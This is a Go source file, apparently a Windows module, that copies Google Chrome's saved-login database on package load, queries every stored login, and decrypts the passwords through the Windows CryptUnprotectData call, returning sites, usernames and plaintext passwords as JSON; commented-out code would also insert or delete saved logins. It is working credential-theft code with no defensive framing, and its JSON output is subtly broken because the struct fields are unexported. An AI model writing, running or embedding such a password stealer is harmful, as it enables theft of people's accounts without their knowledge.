// +build windows

package chromePwd

import (
	"database/sql"
	"encoding/json"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

type Users struct {
	UserId int
	Uname  string
	Uage   string
}

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procEncryData   = dllcrypt32.NewProc("CryptProtectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	dataPath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
)

func init() {
	data, err := ioutil.ReadFile(dataPath)
	err = ioutil.WriteFile(dataPath+".bak", data, 0644)
	if err != nil {
		return
	}
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}

func Encrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procEncryData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

type PwdInfoNode struct {
	origin_url       string `json:"origin_url"`
	action_url       string `json:"action_url"`
	username_element string `json:"username_element"`
	username_value   string `json:"username_value"`
	password_element string `json:"password_element"`
	password_value   string `json:"password_value"`
}

func GetChromePwd() (string, error) {
	var Pwdnode PwdInfoNode
	var Pwdnodelist []PwdInfoNode
	db, err := sql.Open("sqlite3", dataPath+".bak")
	if err != nil {
		return "", err
	}
	fmt.Println(dataPath)
	//"select EthName,Status,IFNULL(NetMod, \"\"),BrtName,Type from NETWORK_DEV"
	rows, err := db.Query("select origin_url,action_url,username_element,username_value,password_element,password_value from logins")
	if err != nil {
		return "", err
	}
	defer rows.Close()
	for rows.Next() {
		var password_value string
		rows.Scan(&Pwdnode.origin_url, &Pwdnode.action_url, &Pwdnode.username_element, &Pwdnode.username_value, &Pwdnode.password_element, &password_value)
		password_value_Decrypt, err := Decrypt([]byte(password_value))
		if err == nil {
			Pwdnode.password_value = string(password_value_Decrypt)
		}
		Pwdnodelist = append(Pwdnodelist, Pwdnode)
	}

	b, err := json.Marshal(Pwdnodelist)
	if err != nil {
		fmt.Println("JSON ERR:", err)
	}

	return string(b), nil
}

//func AddChromePwd(ChromePwdInfo ChromePwd) error {
//
//	db, err := sql.Open("sqlite3", dataPath+".bak")
//	//db, err := sql.Open("sqlite3", "C:\\Users\\Administrator\\Desktop\\Login Data")
//	if err != nil {
//		return err
//	}
//	//插入数据
//
//
//	stmt, err := db.Prepare("INSERT INTO logins (origin_url, action_url, username_element,username_value,password_element,password_value,signon_realm,preferred,date_created,blacklisted_by_user,scheme) values(?,?,?,?,?,?,?,?,?,?,?)")
//	if err != nil {
//		return err
//	}
//	pass, err := Encrypt([]byte(ChromePwdInfo.Password_value))
//	//pass, err = Decrypt(pass)
//	//log.Print(string(pass))
//
//	origin_url := strings.Replace(Origin_url, "{{addr}}", ChromePwdInfo.Dstaddr, -1)
//	action_url := strings.Replace(Action_url, "{{addr}}", ChromePwdInfo.Dstaddr, -1)
//	signon_realm := strings.Replace(Signon_realm, "{{addr}}", ChromePwdInfo.Dstaddr, -1)
//
//	res, err := stmt.Exec(origin_url, action_url,ChromePwdInfo.Username_element,ChromePwdInfo.Username_value,ChromePwdInfo.Password_element,string(pass),signon_realm,1,ChromePwdInfo.Date_created,0,1)
//	if err != nil {
//		return err
//	}
//
//	_, err = res.LastInsertId()
//	if err != nil {
//		return err
//	}
//	db.Close()
//	return err
//}
//
//func DelChromePwd(dstaddr string) error {
//	db, err := sql.Open("sqlite3", dataPath+".bak")
//	//db, err := sql.Open("sqlite3", "C:\\Users\\Administrator\\Desktop\\Login Data")
//	if err != nil {
//		return err
//	}
//
//	stmt, err := db.Prepare("delete from logins where origin_url=?")
//	if err != nil {
//		return err
//	}
//	origin_url := strings.Replace(Origin_url, "{{addr}}", dstaddr, -1)
//	_, err = stmt.Exec(origin_url)
//	if err != nil {
//		return err
//	}
//	db.Close()
//	return err
//}

//
